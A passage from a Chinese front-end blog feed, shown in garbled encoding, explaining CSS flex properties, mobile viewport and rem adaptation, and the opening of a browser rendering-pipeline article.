æ˜¯ä¸€ä¸ªç™¾åˆ†æ¯”è€Œä¸æ˜¯ä¸€ä¸ªéè´Ÿæ•°å­—ï¼‰ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item-1</span> &#123;<span class="attribute">flex</span>: <span class="number">0%</span>;&#125;</span><br><span class="line"><span class="selector-class">.item-1</span> &#123;</span><br><span class="line">  <span class="attribute">flex-grow</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">flex-shrink</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">flex-basis</span>: <span class="number">0%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.item-2</span> &#123;<span class="attribute">flex</span>: <span class="number">24px</span>;&#125;</span><br><span class="line"><span class="selector-class">.item-2</span> &#123;</span><br><span class="line">  <span class="attribute">flex-grow</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">flex-shrink</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">flex-basis</span>: <span class="number">24px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ flex å–å€¼ä¸ºä¸¤ä¸ªéè´Ÿæ•°å­—ï¼Œåˆ™åˆ†åˆ«è§†ä¸º flex-grow å’Œ flex-shrink çš„å€¼ï¼Œflex-basis å– 0%ï¼Œå¦‚ä¸‹æ˜¯ç­‰åŒçš„ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;<span class="attribute">flex</span>: <span class="number">2</span> <span class="number">3</span>;&#125;</span><br><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex-grow</span>: <span class="number">2</span>;</span><br><span class="line">  <span class="attribute">flex-shrink</span>: <span class="number">3</span>;</span><br><span class="line">  <span class="attribute">flex-basis</span>: <span class="number">0%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ flex å–å€¼ä¸ºä¸€ä¸ªéè´Ÿæ•°å­—å’Œä¸€ä¸ªé•¿åº¦æˆ–ç™¾åˆ†æ¯”ï¼Œåˆ™åˆ†åˆ«è§†ä¸º flex-grow å’Œ flex-basis çš„å€¼ï¼Œflex-shrink å– 1ï¼Œå¦‚ä¸‹æ˜¯ç­‰åŒçš„ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;<span class="attribute">flex</span>: <span class="number">11</span> <span class="number">32px</span>;&#125;</span><br><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex-grow</span>: <span class="number">11</span>;</span><br><span class="line">  <span class="attribute">flex-shrink</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">flex-basis</span>: <span class="number">32px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>grow å’Œ shrink æ˜¯ä¸€å¯¹åŒèƒèƒï¼Œgrow è¡¨ç¤ºä¼¸å¼ å› å­ï¼Œshrink è¡¨ç¤ºæ˜¯æ”¶ç¼©å› å­ã€‚shrink åœ¨ flex å®¹å™¨ä¸‹çš„å­å…ƒç´ çš„å®½åº¦æ€»å’Œæ¯”å®¹å™¨å°çš„æ—¶å€™èµ·ä½œç”¨ã€‚ grow å®šä¹‰äº†å­å…ƒç´ çš„å°ºå¯¸å¢é•¿å› å­ï¼Œå®¹å™¨ä¸­é™¤å»å­å…ƒç´ ä¹‹å’Œå‰©ä¸‹çš„å°ºå¯¸ä¼šæŒ‰ç…§å„ä¸ªå­å…ƒç´ çš„ grow å€¼è¿›è¡Œå¹³åˆ†åŠ å¤§å„ä¸ªå­å…ƒç´ ä¸Šã€‚</p><p><br></p><h4 id="3-4-flex-wrapã€flex-shrinkã€flex-growçš„å…³ç³»"><a href="#3-4-flex-wrapã€flex-shrinkã€flex-growçš„å…³ç³»" class="headerlink" title="3.4 flex-wrapã€flex-shrinkã€flex-growçš„å…³ç³»"></a>3.4 flex-wrapã€flex-shrinkã€flex-growçš„å…³ç³»</h4><p>å®¹å™¨çš„ flex-wrap ä¸å­é¡¹çš„ flex-shrinkã€flex-grow ä¹‹é—´çš„å…³ç³»</p><ol><li>å½“ flex-wrap ä¸º wrap | wrap-reverseï¼Œä¸”å­é¡¹å®½åº¦å’Œä¸åŠçˆ¶å®¹å™¨å®½åº¦æ—¶ï¼Œflex-grow ä¼šèµ·ä½œç”¨ï¼Œå­é¡¹ä¼šæ ¹æ® flex-grow è®¾å®šçš„å€¼æ”¾å¤§ï¼ˆä¸º0çš„é¡¹ä¸æ”¾å¤§ï¼‰</li><li>å½“ flex-wrap ä¸º wrap | wrap-reverseï¼Œä¸”å­é¡¹å®½åº¦å’Œè¶…è¿‡çˆ¶å®¹å™¨å®½åº¦æ—¶ï¼Œé¦–å…ˆä¸€å®šä¼šæ¢è¡Œï¼Œæ¢è¡Œåï¼Œæ¯ä¸€è¡Œçš„å³ç«¯éƒ½å¯èƒ½ä¼šæœ‰å‰©ä½™ç©ºé—´ï¼ˆæœ€åä¸€è¡ŒåŒ…å«çš„å­é¡¹å¯èƒ½æ¯”å‰å‡ è¡Œå°‘ï¼Œæ‰€ä»¥å‰©ä½™ç©ºé—´å¯èƒ½ä¼šæ›´å¤§ï¼‰ï¼Œè¿™æ—¶ flex-grow ä¼šèµ·ä½œç”¨ï¼Œè‹¥å½“å‰è¡Œæ‰€æœ‰å­é¡¹çš„ flex-grow éƒ½ä¸º0ï¼Œåˆ™å‰©ä½™ç©ºé—´ä¿ç•™ï¼Œè‹¥å½“å‰è¡Œå­˜åœ¨ä¸€ä¸ªå­é¡¹çš„ flex-grow ä¸ä¸º0ï¼Œåˆ™å‰©ä½™ç©ºé—´ä¼šè¢« flex-grow ä¸ä¸º0çš„å­é¡¹å æ®</li><li>å½“ flex-wrap ä¸º nowrapï¼Œä¸”å­é¡¹å®½åº¦å’Œä¸åŠçˆ¶å®¹å™¨å®½åº¦æ—¶ï¼Œflex-grow ä¼šèµ·ä½œç”¨ï¼Œå­é¡¹ä¼šæ ¹æ® flex-grow è®¾å®šçš„å€¼æ”¾å¤§ï¼ˆä¸º0çš„é¡¹ä¸æ”¾å¤§ï¼‰</li><li>å½“ flex-wrap ä¸º nowrapï¼Œä¸”å­é¡¹å®½åº¦å’Œè¶…è¿‡çˆ¶å®¹å™¨å®½åº¦æ—¶ï¼Œflex-shrink ä¼šèµ·ä½œç”¨ï¼Œå­é¡¹ä¼šæ ¹æ® flex-shrink è®¾å®šçš„å€¼è¿›è¡Œç¼©å°ï¼ˆä¸º0çš„é¡¹ä¸ç¼©å°ï¼‰ã€‚ä½†è¿™é‡Œæœ‰ä¸€ä¸ªè¾ƒä¸ºç‰¹æ®Šæƒ…å†µï¼Œå°±æ˜¯å½“è¿™ä¸€è¡Œæ‰€æœ‰å­é¡¹ flex-shrink éƒ½ä¸º0æ—¶ï¼Œä¹Ÿå°±æ˜¯è¯´æ‰€æœ‰çš„å­é¡¹éƒ½ä¸èƒ½ç¼©å°ï¼Œå°±ä¼šå‡ºç°è®¨åŒçš„æ¨ªå‘æ»šåŠ¨æ¡</li><li>æ€»ç»“ä¸Šé¢å››ç‚¹ï¼Œå¯ä»¥çœ‹å‡ºä¸ç®¡åœ¨ä»€ä¹ˆæƒ…å†µä¸‹ï¼Œåœ¨åŒä¸€æ—¶é—´ï¼Œflex-shrink å’Œ flex-grow åªæœ‰ä¸€ä¸ªèƒ½èµ·ä½œç”¨ï¼Œè¿™å…¶ä¸­çš„é“ç†ç»†æƒ³èµ·æ¥ä¹Ÿå¾ˆæµ…æ˜¾ï¼šç©ºé—´è¶³å¤Ÿæ—¶ï¼Œflex-grow å°±æœ‰å‘æŒ¥çš„ä½™åœ°ï¼Œè€Œç©ºé—´ä¸è¶³æ—¶ï¼Œflex-shrink å°±èƒ½èµ·ä½œç”¨ã€‚å½“ç„¶ï¼Œflex-wrap çš„å€¼ä¸º wrap | wrap-reverse æ—¶ï¼Œè¡¨æ˜å¯ä»¥æ¢è¡Œï¼Œæ—¢ç„¶å¯ä»¥æ¢è¡Œï¼Œä¸€èˆ¬æƒ…å†µä¸‹ç©ºé—´å°±æ€»æ˜¯è¶³å¤Ÿçš„ï¼Œflex-shrink å½“ç„¶å°±ä¸ä¼šèµ·ä½œç”¨</li></ol><p><br></p><h4 id="3-5-flexå®½åº¦è®¡ç®—"><a href="#3-5-flexå®½åº¦è®¡ç®—" class="headerlink" title="3.5 flexå®½åº¦è®¡ç®—"></a>3.5 flexå®½åº¦è®¡ç®—</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">  * &#123;</span></span><br><span class="line"><span class="undefined">    padding: 0;</span></span><br><span class="line"><span class="undefined">    margin: 0;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="css">  <span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="undefined">    width: 600px;</span></span><br><span class="line"><span class="undefined">    height: 300px;</span></span><br><span class="line"><span class="undefined">    display: flex;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="css">  <span class="selector-class">.left</span> &#123;</span></span><br><span class="line"><span class="undefined">    flex: 1 2 500px;</span></span><br><span class="line"><span class="undefined">    background: red;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="css">  <span class="selector-class">.right</span> &#123;</span></span><br><span class="line"><span class="undefined">    flex: 2 1 400px;</span></span><br><span class="line"><span class="undefined">    background: blue;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">å­å…ƒç´ çš„ flex-shrink çš„å€¼åˆ†åˆ«ä¸º 2ï¼Œ1</span><br><span class="line">æº¢å‡ºï¼š500+400 - 600 = 300ã€‚</span><br><span class="line">æ€»æƒé‡ä¸º 2 * 500+ 1 * 400 = 1400</span><br><span class="line">ä¸¤ä¸ªå…ƒç´ åˆ†åˆ«æ”¶ç¼©ï¼š</span><br><span class="line">300 * 2(flex-shrink) * 500(width) / 1400= 214.28</span><br><span class="line">300 * 1(flex-shrink) * 400(width) / 1400= 85.72</span><br><span class="line">ä¸‰ä¸ªå…ƒç´ çš„æœ€ç»ˆå®½åº¦åˆ†åˆ«ä¸ºï¼š</span><br><span class="line">500 - 214.28 = 285.72</span><br><span class="line">400 - 85.72 = 314.28</span><br></pre></td></tr></table></figure><p>æ”¶ç¼©ï¼šå­é¡¹å®½åº¦ - ç§»é™¤å®½åº¦ <em> å­é¡¹æ”¶ç¼©<strong>æƒé‡æ¯”ä¾‹</strong>ï¼ˆè‡ªèº«å®½åº¦ </em> shrink / æ€»æƒé‡ï¼‰<br>æ‹‰ä¼¸ä¸æ”¶ç¼©ç®—æ³•ä¸ä¸€æ ·ï¼šå­é¡¹å®½åº¦ + å‰©ä½™å®½åº¦ * å­é¡¹æ‹‰ä¼¸æ¯”ä¾‹</p><p><br></p><p><br></p><h3 id="5-ç§»åŠ¨ç«¯é€‚é…"><a href="#5-ç§»åŠ¨ç«¯é€‚é…" class="headerlink" title="5. ç§»åŠ¨ç«¯é€‚é…"></a>5. ç§»åŠ¨ç«¯é€‚é…</h3><h4 id="5-1-meta-viewporté€‚é…"><a href="#5-1-meta-viewporté€‚é…" class="headerlink" title="5.1 meta-viewporté€‚é…"></a>5.1 meta-viewporté€‚é…</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span></span></span><br><span class="line"><span class="tag">  <span class="attr">name</span>=<span class="string">"viewport"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0, minimun-scale=1.0, maximum-scale=1.0, user-scalable=no"</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­ device-width æ„æ€æ˜¯è®¾å¤‡å®½åº¦</p><ul><li>widthï¼šå±æ€§æ§åˆ¶è§†å£çš„å®½åº¦ï¼Œå¯ä»¥è®¾ç½®å…·ä½“çš„å®½åº¦å¦‚ï¼š<code>width=700</code>ï¼Œä½†æ˜¯ä¸€èˆ¬è¿™ä¹ˆä½¿ç”¨ï¼Œéƒ½æ˜¯ä½¿ç”¨ <code>width=device-width</code></li><li>inital-scaleï¼šé¡µé¢åˆå§‹ç¼©æ”¾å€¼ï¼Œé»˜è®¤ä¸º 1ï¼›</li><li>maximum-scaleï¼šå…è®¸ç”¨æˆ·ç¼©æ”¾åˆ°çš„æœ€å¤§æ¯”ä¾‹ã€‚</li><li>minimum-scaleï¼šå…è®¸ç”¨æˆ·ç¼©æ”¾åˆ°çš„æœ€å°æ¯”ä¾‹ã€‚</li><li>user-scalableï¼šç”¨æˆ·æ˜¯å¦å¯ä»¥æ‰‹åŠ¨ç¼©æ”¾ã€‚</li></ul><p>ä¸ºäº†èƒ½åœ¨ç§»åŠ¨è®¾å¤‡ä¸Šæ­£å¸¸æ˜¾ç¤ºé‚£äº›ä¼ ç»Ÿçš„ä¸ºæ¡Œé¢æµè§ˆå™¨è®¾è®¡çš„ç½‘ç«™ï¼Œç§»åŠ¨è®¾å¤‡ä¸Šçš„æµè§ˆå™¨éƒ½ä¼šæŠŠè‡ªå·±é»˜è®¤çš„viewportè®¾ä¸º980pxæˆ–1024pxï¼ˆä¹Ÿå¯èƒ½æ˜¯å…¶å®ƒå€¼ï¼Œè¿™ä¸ªæ˜¯ç”±è®¾å¤‡è‡ªå·±å†³å®šçš„ï¼‰ï¼Œè¿™æ ·åšæ˜¯å› ä¸ºè®¸å¤šé¡µé¢æ²¡æœ‰åšç§»åŠ¨ç«¯ä¼˜åŒ–ï¼Œåœ¨å°çª—å£æ¸²æŸ“æ—¶ä¼šä¹±æ‰ï¼ˆæˆ–çœ‹èµ·æ¥ä¹±ï¼‰ã€‚æ‰€ä»¥ï¼Œè¿™ç§è™šæ‹Ÿè§†å£æ˜¯ä¸€ç§è®©æœªåšç§»åŠ¨ç«¯ä¼˜åŒ–çš„ç½‘ç«™åœ¨çª„å±è®¾å¤‡ä¸Šçœ‹èµ·æ¥æ›´å¥½çš„åŠæ³•ã€‚</p><p><br></p><h4 id="5-2-åª’ä½“æŸ¥è¯¢"><a href="#5-2-åª’ä½“æŸ¥è¯¢" class="headerlink" title="5.2 åª’ä½“æŸ¥è¯¢"></a>5.2 åª’ä½“æŸ¥è¯¢</h4><p><em><code>@media</code></em>æŸ¥è¯¢é’ˆå¯¹ä¸åŒçš„å±å¹•å°ºå¯¸è®¾ç½®ä¸åŒçš„æ ·å¼ï¼Œå½“è¦è®¾ç½®å“åº”å¼é¡µé¢æ—¶ï¼Œè¿˜æ˜¯å¾ˆæœ‰ç”¨çš„ã€‚å½“ä½ é‡ç½®æµè§ˆå™¨å¤§å°çš„è¿‡ç¨‹ä¸­ï¼Œé¡µé¢ä¹Ÿä¼šæ ¹æ®æµè§ˆå™¨çš„å®½åº¦å’Œé«˜åº¦é‡æ–°æ¸²æŸ“é¡µé¢ã€‚</p><p><br></p><h4 id="5-3-em-rem-vw-vh"><a href="#5-3-em-rem-vw-vh" class="headerlink" title="5.3 em, rem, vw, vh"></a>5.3 em, rem, vw, vh</h4><p>emå’Œreméƒ½æ˜¯ç›¸å¯¹å•ä½é•¿åº¦</p><ul><li>emæ˜¯ç›¸å¯¹çˆ¶çº§font-sizeå˜åŒ–çš„ï¼Œå¦‚æœåµŒå¥—è¿‡æ·±ï¼Œè®¡ç®—ä¼šæ¯”è¾ƒç¹çï¼Œå› æ­¤ä¸€èˆ¬å¤§èŒƒå›´ä¸é€‚ç”¨ï¼Œå°èŒƒå›´å¯ç»“åˆpxå•ä½ä½¿ç”¨ã€‚</li><li>remæ˜¯ç›¸å¯¹htmlæ ¹å…ƒç´ font-sizeå˜åŒ–çš„ï¼Œæ²¡æœ‰emçš„ç¹çè®¡ç®—ï¼Œé…åˆåŠ¨æ€è®¡ç®—remçš„jsä»£ç ï¼Œremåœ¨ç§»åŠ¨ç«¯å¸ƒå±€ä¸­å¾ˆå—æ¬¢è¿<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">win</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> doc = win.document;</span><br><span class="line"><span class="keyword">var</span> docEl = doc.documentElement;</span><br><span class="line"><span class="keyword">var</span> tid;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">refreshRem</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> width = docEl.getBoundingClientRect().width;        </span><br><span class="line"><span class="keyword">if</span> (width &gt;=<span class="number">750</span>) width = <span class="number">750</span>;</span><br><span class="line"><span class="keyword">if</span>(width&lt;=<span class="number">320</span>) width=<span class="number">320</span>;</span><br><span class="line"><span class="keyword">var</span> rem = width / <span class="number">7.5</span>;</span><br><span class="line">docEl.style.fontSize = rem + <span class="string">'px'</span>;</span><br><span class="line">&#125;</span><br><span class="line">win.addEventListener(<span class="string">'resize'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">clearTimeout(tid);</span><br><span class="line">tid = setTimeout(refreshRem, <span class="number">300</span>);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line">refreshRem();</span><br><span class="line">&#125;)(<span class="built_in">window</span>);</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://juejin.cn/post/6844903591149305864" target="_blank" rel="noopener">Flex æ’ç‰ˆæºç åˆ†æ</a></li><li><a href="https://juejin.cn/post/6844903817503326216" target="_blank" rel="noopener">ç§»åŠ¨ç«¯ä¸‰ç§é€‚é…æ–¹æ¡ˆ</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>æ¸²æŸ“æµç¨‹ + é‡æ’é‡æµåˆå¹¶</title>
      <link href="/2021/08/13/%E9%87%8D%E6%8E%92%E9%87%8D%E6%B5%81%E5%90%88%E5%B9%B6/"/>
      <url>/2021/08/13/%E9%87%8D%E6%8E%92%E9%87%8D%E6%B5%81%E5%90%88%E5%B9%B6/</url>
      <content type="html"><![CDATA[<p>è¾“å…¥çš„HTML + CSS + JSï¼Œæœ€åè¾“å‡ºåƒç´ ï¼Œæˆ‘ä»¬æŠŠè¿™æ ·çš„ä¸€ä¸ªå¤„ç†æµç¨‹å«åšæ¸²æŸ“æµæ°´çº¿ã€‚ä¸€ä¸ªå®Œæ•´çš„æ¸²æŸ“æµæ°´çº¿å¤§è‡´å¯æ€»ç»“ä¸ºå¦‚ä¸‹ï¼š</p><ul><li>æ¸²æŸ“è¿›ç¨‹å°† HTML å†…å®¹è½¬æ¢ä¸ºèƒ½å¤Ÿè¯»æ‡‚çš„ DOM æ ‘ç»“æ„ã€‚</li><li>æ¸²æŸ“å¼•æ“å°† CSS æ ·å¼è¡¨è½¬åŒ–ä¸ºæµè§ˆå™¨å¯ä»¥ç†è§£çš„ styleSheetsï¼Œè®¡ç®—å‡º DOM èŠ‚ç‚¹çš„æ ·å¼ã€‚</li><li>åˆ›å»ºå¸ƒå±€æ ‘ï¼Œå¹¶è®¡ç®—å…ƒç´ çš„å¸ƒå±€ä¿¡æ¯ã€‚</li><li>å¯¹å¸ƒå±€æ ‘è¿›è¡Œåˆ†å±‚ï¼Œå¹¶ç”Ÿæˆåˆ†å±‚æ ‘ã€‚</li><li>ä¸ºæ¯ä¸ªå›¾å±‚ç”Ÿæˆç»˜åˆ¶åˆ—è¡¨ï¼Œå¹¶å°†å…¶æäº¤åˆ°åˆæˆçº¿ç¨‹ã€‚</li><li>åˆæˆçº¿ç¨‹å°†å›¾å±‚åˆ†æˆå›¾å—ï¼Œå¹¶åœ¨å…‰æ …åŒ–çº¿ç¨‹æ± ä¸­å°†å›¾å—è½¬æ¢æˆä½å›¾ã€‚</li><li>åˆæˆçº¿ç¨‹å‘é€ç»˜åˆ¶å›¾å—å‘½ä»¤ DrawQuad ç»™æµè§ˆå™¨è¿›ç¨‹ã€‚æµè§ˆå™¨è¿›ç¨‹æ ¹æ® DrawQuad æ¶ˆæ¯ç”Ÿæˆé¡µé¢ï¼Œå¹¶æ˜¾ç¤ºåˆ°æ˜¾ç¤ºå™¨ä¸Šã€‚</li></ul><p>ç®€å•æ¦‚æ‹¬ä¸ºï¼šæ„å»º DOM æ ‘ã€æ ·å¼è®¡ç®—ã€å¸ƒå±€é˜¶æ®µã€åˆ†å±‚ã€ç»˜åˆ¶ã€åˆ†å—ã€å…‰æ …åŒ–å’Œåˆæˆã€‚</p><p><br></p><h3 id="1-æ„å»ºDOMæ ‘"><a href="#1-æ„å»ºDOMæ ‘" class="headerlink" title="1. æ„å»ºDOMæ ‘"></a>1. æ„å»ºDOMæ ‘</h3><p>æ„å»º DOM æ ‘çš„è¾“å…¥å†…å®¹æ˜¯ä¸€ä¸ªéå¸¸ç®€å•çš„ HTML æ–‡ä»¶ï¼Œç„¶åç»ç”± HTML è§£æå™¨è§£æï¼Œæœ€ç»ˆè¾“å‡ºæ ‘çŠ¶ç»“æ„çš„ DOM.</p><p><br></p><h3 id="2-æ ·å¼è®¡ç®—-è®¡ç®—æ¯ä¸ªå…ƒç´ çš„å…·ä½“æ ·å¼"><a href="#2-æ ·å¼è®¡ç®—-è®¡ç®—æ¯ä¸ªå…ƒç´ çš„å…·ä½“æ ·å¼" class="headerlink" title="2. æ ·å¼è®¡ç®—: è®¡ç®—æ¯ä¸ªå…ƒç´ çš„å…·ä½“æ ·å¼"></a>2. æ ·å¼è®¡ç®—: è®¡ç®—æ¯ä¸ªå…ƒç´ çš„å…·ä½“æ ·å¼</h3><p>è®¡ç®—å‡º DOM èŠ‚ç‚¹ä¸­æ¯ä¸ªå…ƒç´ çš„å…·ä½“æ ·å¼ï¼Œè¿™ä¸ªé˜¶æ®µå¤§ä½“å¯åˆ†ä¸ºä¸‰æ­¥æ¥å®Œæˆ</p><ol><li>æ¸²æŸ“å¼•æ“ä¼šæŠŠè·å–åˆ°çš„ CSS æ–‡æœ¬å…¨éƒ¨è½¬æ¢ä¸º <code>styleSheets</code> ï¼Œè¯¥ç»“æ„åŒæ—¶å…·å¤‡äº†æŸ¥è¯¢å’Œä¿®æ”¹åŠŸèƒ½ï¼Œä¸ºåé¢çš„æ ·å¼æ“ä½œæä¾›åŸºç¡€ã€‚æ§åˆ¶å°ä¸­è¾“å…¥<code>document.styleSheets</code>å¯çœ‹</li></ol><p><img src="/2021/08/13/é‡æ’é‡æµåˆå¹¶/1.jpg" style="width: 500px"></p><ol start="2"><li><p>è½¬æ¢æ ·å¼è¡¨ä¸­çš„å±æ€§å€¼ï¼Œä½¿å…¶æ ‡å‡†åŒ–<br><img src="/2021/08/13/é‡æ’é‡æµåˆå¹¶/2.jpg" style="width: 500px"></p></li><li><p>è®¡ç®—å‡º DOM æ ‘ä¸­æ¯ä¸ªèŠ‚ç‚¹çš„å…·ä½“æ ·å¼</p></li></ol><p><br></p><h3 id="3-åˆ›å»ºå¸ƒå±€æ ‘"><a href="#3-åˆ›å»ºå¸ƒå±€æ ‘" class="headerlink" title="3. åˆ›å»ºå¸ƒå±€æ ‘"></a>3. åˆ›å»ºå¸ƒå±€æ ‘</h3><p>åœ¨æ˜¾ç¤ºä¹‹å‰ï¼Œæˆ‘ä»¬è¿˜è¦é¢å¤–åœ°æ„å»ºä¸€æ£µåªåŒ…å«å¯è§å…ƒç´ å¸ƒå±€æ ‘ã€‚éå† DOM æ ‘ä¸­çš„æ‰€æœ‰å¯è§èŠ‚ç‚¹ï¼Œå¹¶æŠŠè¿™äº›èŠ‚ç‚¹åŠ åˆ°å¸ƒå±€æ ‘ä¸­ã€‚<br><img src="/2021/08/13/é‡æ’é‡æµåˆå¹¶/3.jpg" style="width: 500px"></p><p><br></p><h3 id="4-å¸ƒå±€é˜¶æ®µ"><a href="#4-å¸ƒå±€é˜¶æ®µ" class="headerlink" title="4. å¸ƒå±€é˜¶æ®µ"></a>4. å¸ƒå±€é˜¶æ®µ</h3><h4 id="4-1-åˆ†å±‚"><a href="#4-1-åˆ†å±‚" class="headerlink" title="4.1 åˆ†å±‚"></a>4.1 åˆ†å±‚</h4><p>å› ä¸ºé¡µé¢ä¸­æœ‰å¾ˆå¤šå¤æ‚çš„æ•ˆæœï¼Œå¦‚ä¸€äº›å¤æ‚çš„ 3D å˜æ¢ã€é¡µé¢æ»šåŠ¨ï¼Œæˆ–è€…ä½¿ç”¨ z-indexing åš z è½´æ’åºç­‰ï¼Œä¸ºäº†æ›´åŠ æ–¹ä¾¿åœ°å®ç°è¿™äº›æ•ˆæœï¼Œæ¸²æŸ“å¼•æ“è¿˜éœ€è¦ä¸ºç‰¹å®šçš„èŠ‚ç‚¹ç”Ÿæˆä¸“ç”¨çš„å›¾å±‚ï¼Œå¹¶ç”Ÿæˆä¸€æ£µå¯¹åº”çš„å›¾å±‚æ ‘ã€‚</p><p>æµè§ˆå™¨çš„é¡µé¢å®é™…ä¸Šè¢«åˆ†æˆäº†å¾ˆå¤šå›¾å±‚ï¼Œè¿™äº›å›¾å±‚å åŠ ååˆæˆäº†æœ€ç»ˆçš„é¡µé¢ã€‚</p><p>æ¸²æŸ“å¼•æ“æ‰ä¼šä¸ºç‰¹å®šçš„èŠ‚ç‚¹åˆ›å»ºæ–°çš„å›¾å±‚å‘¢ï¼Ÿ</p><ul><li>å®šä½å±æ€§çš„å…ƒç´ </li><li>å®šä¹‰é€æ˜å±æ€§çš„å…ƒç´ ã€</li><li>ä½¿ç”¨ CSS æ»¤é•œçš„å…ƒç´ </li><li>z-indexå…ƒç´ </li><li>éœ€è¦è£å‰ªçš„åœ°æ–¹ï¼ˆå‡ºç°æ»šåŠ¨æ¡ï¼‰<br><img src="/2021/08/13/é‡æ’é‡æµåˆå¹¶/4.jpg" style="width: 300px"></li></ul><p><br></p><h4 id="4-2-å›¾å±‚ç»˜åˆ¶"><a href="#4-2-å›¾å±‚ç»˜åˆ¶" class="headerlink" title="4.2 å›¾å±‚ç»˜åˆ¶"></a>4.2 å›¾å±‚ç»˜åˆ¶</h4><p>æ¸²æŸ“å¼•æ“ä¼šæŠŠä¸€ä¸ªå›¾å±‚çš„ç»˜åˆ¶æ‹†åˆ†æˆå¾ˆå¤šå°çš„ç»˜åˆ¶æŒ‡ä»¤ï¼Œç„¶åå†æŠŠè¿™äº›æŒ‡ä»¤æŒ‰ç…§é¡ºåºç»„æˆä¸€ä¸ªå¾…ç»˜åˆ¶åˆ—è¡¨ã€‚</p><p><br></p><h4 id="4-3-æ …æ ¼åŒ–"><a href="#4-3-æ …æ ¼åŒ–" class="headerlink" title="4.3 æ …æ ¼åŒ–"></a>4.3 æ …æ 